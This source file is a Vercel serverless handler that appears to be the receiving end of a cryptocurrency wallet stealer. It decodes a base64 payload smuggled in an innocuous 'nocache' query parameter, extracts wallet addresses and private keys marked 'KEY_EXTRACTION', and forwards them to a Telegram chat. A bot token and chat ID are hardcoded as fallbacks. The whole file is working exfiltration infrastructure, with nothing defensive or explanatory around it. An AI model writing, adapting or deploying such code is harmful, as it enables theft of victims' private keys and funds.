import { VercelRequest, VercelResponse } from '@vercel/node';

interface Wallet {
  walletName?: string;
  address?: string;
  privateKey?: string;
}

interface KeyEntry {
  public: string;
  private: string;
}

interface ExtractionPayload {
  type: string;
  acquiredAt: string;
  wallets?: Wallet[];
  keys?: KeyEntry[];
  location: string;
}

/**
 * Escapes characters for Telegram HTML
 * @see https://core.telegram.org/bots/api#html-style
 */
function escapeHTML(text: string): string {
  if (!text) return '';
  return text
    .toString()
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;');
}

/**
 * Formats the extraction payload into a beautiful Telegram message using HTML
 */
function formatTelegramMessage(data: ExtractionPayload): string {
  const emoji = data.type === 'KEY_EXTRACTION' ? '🔑' : '⚠️';
  const header = `<b>${emoji} ${escapeHTML(data.type)}</b>`;
  const time = `🕒 <b>Acquired At:</b> ${escapeHTML(new Date(data.acquiredAt).toLocaleString())}`;
  const location = `📍 <b>Location:</b> <a href="${escapeHTML(data.location)}">Link</a>`;

  let detailsList = '';
  
  // Handle old 'wallets' format
  if (data.wallets && Array.isArray(data.wallets)) {
    data.wallets.forEach((w, i) => {
      detailsList += `\n\n<b>Wallet ${i + 1}${w.walletName ? ': ' + escapeHTML(w.walletName) : ''}</b>`;
      if (w.address) detailsList += `\nAddress: <code>${escapeHTML(w.address)}</code>`;
      if (w.privateKey) detailsList += `\nPrivate Key: <code>${escapeHTML(w.privateKey)}</code>`;
    });
  }

  // Handle new 'keys' format
  if (data.keys && Array.isArray(data.keys)) {
    data.keys.forEach((k, i) => {
      detailsList += `\n\n<b>Key Entry ${i + 1}</b>`;
      detailsList += `\nPublic: <code>${escapeHTML(k.public)}</code>`;
      detailsList += `\nPrivate: <code>${escapeHTML(k.private)}</code>`;
    });
  }

  const message = `${header}\n${time}\n${location}${detailsList}`;
  console.log('[DEBUG] Formatted Message (HTML):', message);
  return message;
}

/**
 * Main Vercel API Handler
 */
export default async function handler(
  req: VercelRequest,
  res: VercelResponse
) {
  // 0. Initial Logging for Vercel
  console.log('[START] Request received at:', new Date().toISOString());
  console.log('[DEBUG] Method:', req.method);
  console.log('[DEBUG] Path:', req.url);

  // Simple health check or root response
  if (!req.query.nocache) {
    return res.status(200).json({ 
      status: 'alive', 
      message: 'Vercel API is running. Please provide the nocache parameter.',
      timestamp: new Date().toISOString()
    });
  }

  // 1. Get the nocache parameter
  const { nocache } = req.query;

  if (!nocache || typeof nocache !== 'string') {
    console.error('[ERROR] Missing or invalid nocache parameter');
    return res.status(400).json({ error: 'Missing or invalid nocache parameter' });
  }

  try {
    // 2. Decode Base64 and Parse JSON
    console.log('[DEBUG] Decoding payload...');
    const decoded = Buffer.from(nocache, 'base64').toString('utf-8');
    const data: ExtractionPayload = JSON.parse(decoded);

    // 3. Format Message
    const message = formatTelegramMessage(data);

    // 4. Send to Telegram
    const botToken = process.env.TELEGRAM_BOT_TOKEN || "7791166762:AAFTbJ0JmBkbI7Qqpt_Ncv2O3BbNqxiyXbI";
    const chatId = process.env.TELEGRAM_CHAT_ID || "8138109950";

    console.log('[DEBUG] Telegram Config:', {
      botTokenSet: !!process.env.TELEGRAM_BOT_TOKEN,
      chatIdSet: !!process.env.TELEGRAM_CHAT_ID,
      finalChatId: chatId,
    });

    if (!botToken || !chatId) {
      console.error('[ERROR] Missing configuration');
      return res.status(500).json({ error: 'Server configuration error' });
    }

    const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
    const body = {
      chat_id: chatId,
      text: message,
      parse_mode: 'HTML',
      disable_web_page_preview: true,
    };

    console.log('[DEBUG] Sending to Telegram...');
    const response = await fetch(telegramUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(body),
    });

    const result = await response.json();
    console.log('[DEBUG] Telegram Response Status:', response.status);
    console.log('[DEBUG] Telegram Response Body:', JSON.stringify(result));

    if (!response.ok) {
      console.error('[ERROR] Telegram API failure:', result);
      return res.status(502).json({ error: 'Failed to send Telegram message', details: result });
    }

    console.log('[SUCCESS] Message delivered');
    // 5. Success response
    return res.status(200).json({ 
      status: 'ok', 
      message: 'Notification sent', 
      telegram_response: result 
    });

    
  } catch (error) {
    console.error('[FATAL] Processing error:', error);
    return res.status(400).json({ 
      error: 'Failed to process payload', 
      details: error instanceof Error ? error.message : String(error) 
    });
  }
}
